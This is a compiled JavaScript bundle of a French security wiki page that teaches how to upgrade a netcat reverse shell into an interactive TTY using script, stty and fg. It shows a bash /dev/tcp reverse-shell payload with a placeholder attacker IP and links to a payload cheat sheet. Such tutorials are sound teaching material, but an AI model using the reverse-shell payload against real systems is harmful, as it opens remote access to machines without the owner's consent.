"use strict";(globalThis.webpackChunkazurwiki=globalThis.webpackChunkazurwiki||[]).push([[702],{6080:(e,l,s)=>{s.r(l),s.d(l,{assets:()=>o,contentTitle:()=>i,default:()=>u,frontMatter:()=>t,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"redteam/clean-shell","title":"Obtenir un shell propre","description":"Apr\xe8s avoir inject\xe9 votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment am\xe9liorer ce shell ?","source":"@site/docs/20-redteam/03-clean-shell.md","sourceDirName":"20-redteam","slug":"/redteam/clean-shell","permalink":"/azurwiki/redteam/clean-shell","draft":false,"unlisted":false,"editUrl":"https://github.com/haysberg/azurwiki/tree/main/docs/docs/20-redteam/03-clean-shell.md","tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"title":"Obtenir un shell propre","sidebar_label":"Obtenir un shell propre","pagination_label":"Obtenir un shell propre","description":"Apr\xe8s avoir inject\xe9 votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment am\xe9liorer ce shell ?","keywords":["docs","Reverse shell","Netcat","Payload"]},"sidebar":"tutorialSidebar","previous":{"title":"SSTI Flask","permalink":"/azurwiki/redteam/Attaques Web/SSTI Flask"},"next":{"title":"Accueil Reverse","permalink":"/azurwiki/reverse/"}}');var n=s(4848),a=s(8453);const t={title:"Obtenir un shell propre",sidebar_label:"Obtenir un shell propre",pagination_label:"Obtenir un shell propre",description:"Apr\xe8s avoir inject\xe9 votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment am\xe9liorer ce shell ?",keywords:["docs","Reverse shell","Netcat","Payload"]},i=void 0,o={},c=[{value:"Pourquoi am\xe9liorer son reverse shell ?",id:"pourquoi-am\xe9liorer-son-reverse-shell-",level:2},{value:"Comment am\xe9liorer son reverse shell ?",id:"comment-am\xe9liorer-son-reverse-shell-",level:2},{value:"Attacher le shell \xe0 un terminal",id:"attacher-le-shell-\xe0-un-terminal",level:3},{value:"Mettre \xe0 niveau le shell",id:"mettre-\xe0-niveau-le-shell",level:3},{value:"Remettre le terminal local \xe0 ses valeurs par d\xe9faut",id:"remettre-le-terminal-local-\xe0-ses-valeurs-par-d\xe9faut",level:3}];function d(e){const l={a:"a",code:"code",h2:"h2",h3:"h3",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(l.h2,{id:"pourquoi-am\xe9liorer-son-reverse-shell-",children:"Pourquoi am\xe9liorer son reverse shell ?"}),"\n",(0,n.jsxs)(l.p,{children:["Tout d'abord, si vous n'\xeates pas encore \xe0 l'aise avec l'injection de reverse shell, je vous sugg\xe8re de consulter ",(0,n.jsx)(l.a,{href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md",children:"ce lien"})," pour avoir une liste de payloads \xe0 injecter."]}),"\n",(0,n.jsxs)(l.p,{children:["Lorsque vous injectez votre payload (exemple: ",(0,n.jsx)(l.code,{children:"bash -c 'bash -i >& /dev/tcp/[votre IP]/[port d'ecoute de netcat] 0>&1'"}),"), vous obtenez un reverse shell depuis la commande netcat."]}),"\n",(0,n.jsx)(l.p,{children:"Cependant, ce shell est tr\xe8s limit\xe9, vous aurez donc rapidement envie de l'am\xe9liorer."}),"\n",(0,n.jsxs)(l.p,{children:["Par exemple il est impossible d'utiliser les fl\xe8ches pour naviguer dans l'historique des commandes, ou encore d'interrrompre une commande avec ",(0,n.jsx)(l.code,{children:"Ctrl+C"}),"."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"user@local$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.104] from (UNKNOWN) [10.10.11.211] 36734\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nbash-5.1$ ^C\nuser@local$\n"})}),"\n",(0,n.jsx)(l.h2,{id:"comment-am\xe9liorer-son-reverse-shell-",children:"Comment am\xe9liorer son reverse shell ?"}),"\n",(0,n.jsx)(l.h3,{id:"attacher-le-shell-\xe0-un-terminal",children:"Attacher le shell \xe0 un terminal"}),"\n",(0,n.jsxs)(l.p,{children:["Pour am\xe9liorer votre shell, vous pouvez utiliser la commande ",(0,n.jsx)(l.code,{children:"script"})," pour attacher votre shell \xe0 un terminal."]}),"\n",(0,n.jsx)(l.p,{children:"Depuis le shell de la victime, ex\xe9cutez la commande suivante :"}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"bash-5.1$ script /dev/null -c bash\nscript /dev/null -c bash\nScript started, output log file is '/dev/null'.\nbash-5.1$ \n"})}),"\n",(0,n.jsx)(l.p,{children:"Vous obtenez ainsi un second shell, attach\xe9 cette fois au TTY."}),"\n",(0,n.jsx)(l.h3,{id:"mettre-\xe0-niveau-le-shell",children:"Mettre \xe0 niveau le shell"}),"\n",(0,n.jsx)(l.p,{children:"Il faut maintenant indiquer \xe0 notre terminal local d'enregistrer les entr\xe9es clavier et de les envoyer au shell distant."}),"\n",(0,n.jsxs)(l.p,{children:["Mettez d'abord le shell distant en arrir\xe8re-plan avec ",(0,n.jsx)(l.code,{children:"Ctrl+Z"}),"."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"bash-5.1$ ^Z\n[1]+  Stopped                 nc -lvnp 4444\n"})}),"\n",(0,n.jsxs)(l.p,{children:["Utilisez la commande ",(0,n.jsx)(l.code,{children:"stty raw -echo"})," depuis le shell local: cela permet de d\xe9sactiver l'affichage des caract\xe8res saisis et de les envoyer directement au shell distant."]}),"\n",(0,n.jsxs)(l.p,{children:["Remettez le shell distant au premier plan avec ",(0,n.jsx)(l.code,{children:"fg"}),"."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"user@local$ stty raw -echo ; fg\n"})}),"\n",(0,n.jsxs)(l.p,{children:["Pour remettre le curseur au bon endroit, utilisez la commande ",(0,n.jsx)(l.code,{children:"reset"}),"."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"user@local$ stty raw -echo ; fg\nnc -lnvp 4444\n             reset\n"})}),"\n",(0,n.jsxs)(l.p,{children:["Si le type de terminal n'est pas reconnu, indiquez ",(0,n.jsx)(l.code,{children:"screen"}),"."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"user@local$ stty raw -echo ; fg\nnc -lnvp 4444\n            reset\nreset: unknown terminal type unknown\nTerminal type? screen\n"})}),"\n",(0,n.jsxs)(l.p,{children:["Vous avez maintenant acc\xe8s \xe0 un shell compl\xe8tement interactif, dans lequel vous pouvez utiliser les fl\xe8ches pour naviguer dans l'historique des commandes, ou encore interrompre une commande avec ",(0,n.jsx)(l.code,{children:"Ctrl+C"}),"."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"bash-5.1$ ^C\nbash-5.1$ ^C\nbash-5.1$\n"})}),"\n",(0,n.jsx)(l.h3,{id:"remettre-le-terminal-local-\xe0-ses-valeurs-par-d\xe9faut",children:"Remettre le terminal local \xe0 ses valeurs par d\xe9faut"}),"\n",(0,n.jsxs)(l.p,{children:["Pour quitter le shell distant, utilisez la commande ",(0,n.jsx)(l.code,{children:"exit"}),".\nVous quitterz dans un premier temps le shell attach\xe9 au terminal TTY, puis tapez ",(0,n.jsx)(l.code,{children:"exit"})," une seconde fois pour quitter le premier reverse shell."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:"bash-5.1$ exit\nexit\nScript done.\n            bash-5.1$ exit\n                          exit\nuser@local$\n"})}),"\n",(0,n.jsxs)(l.p,{children:["Depuis le shell local, ",(0,n.jsx)(l.strong,{children:"vous ne voyez plus appara\xeetre les caract\xe8res saisis"})," (puisque vous avez d\xe9sactiv\xe9 l'affichage local avec ",(0,n.jsx)(l.code,{children:"stty raw -echo"}),"), utilisez la commande ",(0,n.jsx)(l.code,{children:"stty sane"})," pour remettre le terminal \xe0 ses valeurs par d\xe9faut."]}),"\n",(0,n.jsx)(l.pre,{children:(0,n.jsx)(l.code,{className:"language-bash",children:'user@local$ stty sane # Vous tapez la commande sans la voir\nuser@local$ echo "salut" # Le terminal est remis \xe0 ses valeurs par d\xe9faut\nsalut\nuser@local$\n'})})]})}function u(e={}){const{wrapper:l}={...(0,a.R)(),...e.components};return l?(0,n.jsx)(l,{...e,children:(0,n.jsx)(d,{...e})}):d(e)}},8453:(e,l,s)=>{s.d(l,{R:()=>t,x:()=>i});var r=s(6540);const n={},a=r.createContext(n);function t(e){const l=r.useContext(a);return r.useMemo(function(){return"function"==typeof e?e(l):{...l,...e}},[l,e])}function i(e){let l;return l=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:t(e.components),r.createElement(a.Provider,{value:l},e.children)}}}]);